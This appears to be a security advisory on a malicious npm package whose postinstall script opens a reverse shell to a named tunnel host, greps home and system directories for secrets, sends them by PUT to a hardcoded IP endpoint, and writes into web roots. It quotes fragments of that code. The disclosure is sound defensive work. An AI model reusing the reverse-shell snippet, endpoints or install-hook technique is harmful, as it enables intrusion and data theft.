summary: Postinstall script opens reverse shell and exfiltrates environment/filesystem secrets
details: The package's postinstall.js runs automatically on npm install and performs three malicious actions on matching Linux hosts. (1) It opens a TCP socket to bdyec-159-153-180-200.run.pinggy-free.link:38391 and pipes /bin/sh -i over it (`net.connect(SHELL_PORT, SHELL_HOST); spawn('/bin/sh', ['-i']); socket.pipe(sh.stdin); sh.stdout.pipe(socket)`), giving the operator an interactive shell with the installer's privileges. (2) It iterates process.env, runs `grep -RaoE 'HTB{...}'` across /root, /home, /etc, /var, /opt, gathers id/hostname/ps/ls/find diagnostics, and PUTs the results as JSON to hardcoded endpoints including the bare-IP host http://154.57.164.70:30569/api/modules/ECT-987654. (3) It writes attacker-chosen content into web roots (/usr/share/nginx/html/, /var/www/html/, /app/, /usr/src/app/, /srv/http/, /workspace/). Although the author labels this a 'CTF payload for verdaccio supply-chain testing' and gates execution to hosts whose hostname startsWith('scan-') or whose cwd contains '/tmp/pkg', the gate will match real systems with those characteristics and the payload is a fully functional reverse shell + exfiltration + web-root defacement.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
